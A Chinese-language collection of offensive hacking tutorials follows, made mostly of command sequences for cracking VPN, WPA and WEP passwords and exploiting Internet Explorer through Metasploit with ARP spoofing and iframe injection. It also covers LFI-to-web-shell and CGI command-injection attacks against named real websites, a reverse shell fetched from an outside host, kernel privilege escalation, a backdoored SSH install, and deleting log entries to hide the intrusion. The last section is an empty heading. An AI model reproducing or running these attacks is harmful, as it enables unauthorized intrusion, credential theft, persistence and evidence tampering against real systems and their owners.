## 目录
* [一、backtrack实践教程--破解VPN](#一、backtrack实践教程--破解VPN)  
* [二、CrackWPA破解_WPA实战教程](#二、CrackWPA破解_WPA实战教程)  
* [三、crackWEP实战课程](#三、crackWEP实战课程) 
* [四、msf上最新ie漏洞的利用](#四、msf上最新ie漏洞的利用) 
* [五、RCE远程代码执行演示](#五、RCE远程代码执行演示) 
* [六、被动OS探测,http嗅探,SSL嗅探](#六、被动OS探测,http嗅探,SSL嗅探)
* [七、利用CGI漏洞入侵,提权,装后门,清日志](#七、利用CGI漏洞入侵,提权,装后门,清日志)
* [八、利用Metasploit Framework远程拿下服务器](#八、利用Metasploit Framework远程拿下服务器)


***
### 一、backtrack实践教程--破解VPN
`[参考网站](http://blog.g0tmi1k.com/2010/03/chap2asleappy-v011-vpn/)`|[参考网站](http://blog.g0tmi1k.com/2010/03/chap2asleappy-v011-vpn/ "参考网站")|
```
    echo 1 > /proc/sys/net/ipv4/ip_forward
    ./arpspoof -i eth0 -t 10.0.0.3 10.0.0.9
    ./arpspoof -i eth0 -t 10.0.0.9 10.0.0.3
    注：两个shell窗口输入arpspoof
    wireshark -i eth0 -k
    注：wireshark过滤条件：chap；启动VPN
    python chap2asleap.py -u [用户名] -c [PPP_CHAP_Challenge] -r [PPP_CHAP_Response] -x -v 
    注：通过wireshark查看输入参数

    cd /pentest/passwords/wordlists/
    cat darkc0de.lst | thc-pptp-bruter -u [用户名] -n 99 -l 999 10.0.0.3
```
### 二、CrackWPA破解_WPA实战教程
```
    airmon-ng start wlan0
    注：结果中记录monitor mode的名字（如：mon7）
    airodump-ng mon7  
    注：抓取目标主机连接无线的相关信息
    airodump-ng --channel 8 --write [文件名] --bssid [无线路由器MAC] mon7
    注：抓包记录被攻击主机的连接
    aireplay-ng --deauth 1 -a [无线路由器MAC] -c [被攻击主机MAC] mon7
    注：断开被攻击主机和无线路由连接，使其再连接，被airodump抓包
    aircrack-ng [文件名] -w /pentest/passwords/wordlists/darkc0de.lst
    注：使用字典破解抓包中的密码
```
### 三、crackWEP实战课程
```
    ifconfig -a
    airmon-ng start wlan0 6
    注：其中6为channel，结果中记录monitor mode的名字（如：mon4）
    airodump-ng --ivs -w pack -c 6 mon4  
    注：抓取无线路由器上产生连接的相关信息，生成pack文件名
    aireplay-ng -1 0 -e [无线路由器节点名] -a [无线路由器MAC] -h [攻击主机MAC] mon4
    注：攻击主机伪装连接AP
    aireplay-ng -5 -b [无线路由器节点名] -h [攻击主机MAC] mon4
    注：获得1500字节PRGA（假的随机生成运算），生成xor文件
    packetforge-ng -0 -a [无线路由器MAC] -h [攻击主机MAC] -k 255.255.255.255 -l 255.255.255.255 -y [xor文件名] -w mrarp
    注：生成伪装的arp包，文件名为mrarp
    aireplay-ng -2 -r mrarp -x 512 mon4
    注：使用mrarp包，回放攻击无线路由器
    aircrack-ng -n 64 -b [无线路由器MAC] [airodum-ng生成的ivs文件]
    注：通过ivs抓包，找回密码
```
### 四、msf上最新ie漏洞的利用
MS09-002 exploit(IE7)Exposed Owning LAN for Pentesters
目标：Windows XP SP0-SP3/IE 6.0 SP0-2 & IE 7.0
```
    msfconsole

    use exploit/windows/browser/ie_iepeers_pointer
    set SRVHOST 192.168.1.103
    注：攻击者IP
    set payload windows/shell/bind_tcp
    exploit
    注：记录生成的http地址
```
```
    vi ieexp.filter

    if(ip.proto==TCP && tcp.dst==80){
        if(search(DATA.data,"Accept-Encoding")){
            replace("Accept-Encoding","Accept-Mousecat");
            msg("zapped Accept-Encoding!\n");
        }
    }
    if(ip.proto==TCP && tcp.src==80){
        if(search(DATA.data,"<body>"){
            replace("<body>","<body><iframe src=\"http://evil.com/evil.html\" width=0 height=0>");
            msg("Filter Run...&&Exploit Code Injected OK!\n");
        }
    }
    注：替换此处http地址为exploit中得到的地址

    etterfilter -o ieexpft ieexp.filter
    ettercap -T -q -F /usr/share/ettercap/ieexpft -M arp:remote /192.168.1.105/ //
    -T：使用TEXT模式启动
    -q：启动安静模式
    -F：加载指定的filter
    -M：指定使用ARP模块
    -P：加载指定的插件
    注：此处为目标主机IP，对目标主机进行arp欺骗
```
目标主机登录IE，随便输入网址，攻击主机向目标主机发送一个木马，获得shell
```
    net user
    注：列出所有用户
    net user linux520 c4rp3nt3r /add
    注：添加用户
    net localgroup administrators linux520 /add
    注：添加用户组
```
* dns spoof演示
192.168.1.101搭建web服务器（使用的google页面）
```
    vi /usr/share/ettercap/etter.dns

    #www.baidu.com  A   192.168.1.101 
    注：#去掉注释

    ettercap -T -q -P dns_spoof -M arp:remote /192.168.1.105/ //
```
目标主机访问www.baidu.com网页将显示192.168.1.101搭建的web页面
### 五、RCE远程代码执行演示
`[参考网站](https://resources.infosecinstitute.com/local-file-inclusion-code-execution/)`|[参考网站](https://resources.infosecinstitute.com/local-file-inclusion-code-execution/ "参考网站")|
```
例子，如下：
http://www.cusferraragolf.it/robots.txt
注：显示所有目录，如：administrator
http://www.cusferraragolf.it/administrator/
注：后台入口页面

http://www.exploit-db.com/exploits/12230
Title:Joomla Component wgPicasa com_wgpicasa Local File Inclusion Vulnerability
EDB-ID:12230

http://www.cusferraragolf.it/index.php?option=com_wgpicasa&controller=../../../../../../../../../../etc/passwd%00
注：显示linux的passwd内容
http://www.cusferraragolf.it/index.php?option=com_wgpicasa&controller=../../../../../../../../../../proc/self/environ%00
注：显示环境变量

Firefox游览器下载User Agent Switcher插件
使用User Agent Switcher，如下：
1）工具->Default User Agent->User Agent Switch->Options->Internet Explorer 6->Edit
User Agent字段修改为<?fputs(fopen("linux520.php","w"),'<?php system($_GET[id]);?>');?>
注：目的是目标主机上生成linux520.php文件，切文件内容为上面的php代码
2）工具->Default User Agent->Internet Explorer->Internet Explorer 6

刷新此网页
http://www.cusferraragolf.it/index.php?option=com_wgpicasa&controller=../../../../../../../../../../proc/self/environ%00
注：通过此操作，生成上述提到的linux520.php文件

http://www.cusferraragolf.it/linux520.php?id=id
注：执行了id命令，显示linux的uid、gid和groups内容
```
### 六、被动OS探测,http嗅探,SSL嗅探
ettercap自身具备数据包转发能力，因此不需要再输入：cat 1>/proc/sys/net/ipv4/ip_forward
两个主要的嗅探选项：  
1）UNIFIED：一般选这个  
2）BRIDGED：桥接模式，用于双网卡
* 被动OS探测
```
ettercap图形工具，Sniff->Unified sniffing->选择网卡
Start->Start sniffing
打开网页(如：www.linux520.com)
View->Profiles，查看对应的网页
```
* http嗅探
```
ettercap图形工具，Sniff->Unified sniffing->选择网卡
Hosts->Scan for hosts
Hosts->host list，选中网关，点击Add To Target1,选中目标主机，点击Add To Target2
Mitm->Arp poisoning->Sniff remote connections
Start->Start sniffing

目标主机，arp -a查看结果为攻击主机的MAC和IP

目标主机，登录邮箱（如：http://mail.163.com）,取消SSL

ettercap显示邮箱账号和密码
```
* SSL嗅探
SSL（Secure Socket Layer）保障Internet上数据传输安全，利用数据加密技术，可确保数据在网络上不会被截取及窃听
```
vi /etc/etter.conf

# if you use ipchains:
   redir_command_on = "ipchains -A input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT %rport"
   redir_command_off = "ipchains -D input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT %rport"
# if you use iptables:
   redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
   redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
注：取消#注释

ettercap图形工具，Sniff->Unified sniffing->选择网卡
Hosts->Scan for hosts
Hosts->host list，选中网关，点击Add To Target1,选中目标主机，点击Add To Target2
Mitm->Arp poisoning->Sniff remote connections
Start->Start sniffing

目标主机，arp -a查看结果为攻击主机的MAC和IP

目标主机，登录邮箱（如：http://mail.163.com）,勾选SSL

ettercap显示邮箱账号和密码
```
### 七、利用CGI漏洞入侵,提权,装后门,清日志
```
google搜索（如：site:motteke.lovepeas.net）
找到cgi，且file的输入参数

修改网址（如：http://motteke.lovepeas.net/page.cgi?file=;ls -la|）
注：显示所有文件名

修改网址（如：http://motteke.lovepeas.net/page.cgi?file=;id|）
注：显示uid、gid、groups

修改网址（如：http://motteke.lovepeas.net/page.cgi?file=;wget http://key0.cn/linuxexp/nc.pl|）
注：下载反弹脚本nc.pl

修改网址（如：http://motteke.lovepeas.net/page.cgi?file=;ls|grep nc.pl|）

ssh -l root key0.cn
注：登录一个外网主机（这样外网才能反弹shell给外网）
nc -lvp 222
注：外网主机上监听222端口

修改网址（如：http://motteke.lovepeas.net/page.cgi?file=;perl nc.pl key0.cn 222|）
注：成功反弹回shell

uname -a
rm -rf nc.pl
cd /tmp
mkdir ...
cd ...
wget http://milw0rn.com/sploits/2009-linux-sendpage3.tar.gz
注：下载exploit(可在www.exploit-db.com->search->Description[root]->选中Linux Kernel 2.4/2.6 sock_sendpage() Local Poot Exploit[3])
tar zxvf 2009*
cd linux*
./run
export HISTFILE=/dev/null
export HISTSIZE=0
mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old
mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old
wget http://key0.cn/linuxexp/bd/sshbd.tgz
tar zxvf sshbd.tgz
cd openssh
./configure --prefix=/usr --sysconfdir=/etc/ssh
注：开始编译安装
make;make install
cp ssh_config sshd_config /etc/ssh
touch -r /etc/ssh/ssh_config.old /etc/ssh/ssh_config
touch -r /etc/ssh/sshd_config.old /etc/ssh/sshd_config
/etc/init.d/sshd restart
ifconfig（如：61.122.86.2）

ssh -l root 61.122.86.2
注：局域网远程连接目标主机
export HISTFILE=/dev/null
export HISTSIZE=0
cd /etc/httpd/logs/

访问http://tools88.com，获得攻击直接的外网IP（如：115.60.133.168）

sed -i '/115.60.133.168/d' access_log*
注：清理Apache日志，删除带有自己IP的条目
```
### 八、利用Metasploit Framework远程拿下服务器








